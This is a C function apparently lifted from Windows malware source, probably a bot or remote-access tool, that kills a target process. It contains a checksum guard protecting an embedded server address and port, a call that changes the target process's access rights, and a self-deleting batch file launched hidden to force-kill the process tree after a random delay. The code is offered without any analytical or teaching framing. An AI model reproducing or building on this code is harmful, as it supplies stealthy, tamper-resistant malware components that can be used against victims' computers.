bool KillProcessByPid(DWORD dwPid, bool bKillChildren)
{
    // <!-------! CRC AREA START !-------!>
    char cCheckString1[DEFAULT];
    sprintf(cCheckString1, "%s:%i", cServer, usPort);
    char *pcStr1 = cCheckString1;
    unsigned long ulCheck1 = 5081+(30*10);
    int nCheck1;
    while((nCheck1 = *pcStr1++))
        ulCheck1 = ((ulCheck1 << 5) + ulCheck1) + nCheck1;
    if(ulCheck1 != ulChecksum3)
        return true;
    // <!-------! CRC AREA STOP !-------!>

    RemoteDaclProtection(dwPid);

    bool bReturn = FALSE;

    if(bKillChildren)
    {
        char cBatchFileContents[DEFAULT];
        strcpy(cBatchFileContents, "@echo off\nTASKKILL /F /T /PID ");

        char cPid[8];
        itoa(dwPid, cPid, 10);
        strcat(cBatchFileContents, cPid);

        strcat(cBatchFileContents, ">NUL\nDEL %0>NUL\n");

        char cBatchFileName[MAX_PATH];
        sprintf(cBatchFileName, "%s\\K%li.bat", cTempDirectory, ulFileHash);

        FILE * fFile;
        fFile = fopen(cBatchFileName, "w");
        if(fFile != NULL)
        {
            fputs(cBatchFileContents, fFile);
            fclose(fFile);
            ShellExecute(NULL, NULL, cBatchFileName, NULL, NULL, SW_HIDE);
        }

        Sleep(GetRandNum(500) + 250);
    }

    HANDLE hProcess = NULL;

    if(GetCurrentProcessId() != dwPid)
          hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, dwPid);

    if(hProcess != NULL)
    {
        if(TerminateProcess(hProcess, NULL))
            bReturn = TRUE;
    }
    else if(bKillChildren)
        bReturn = TRUE;

    CloseHandle(hProcess);

    return bReturn;
}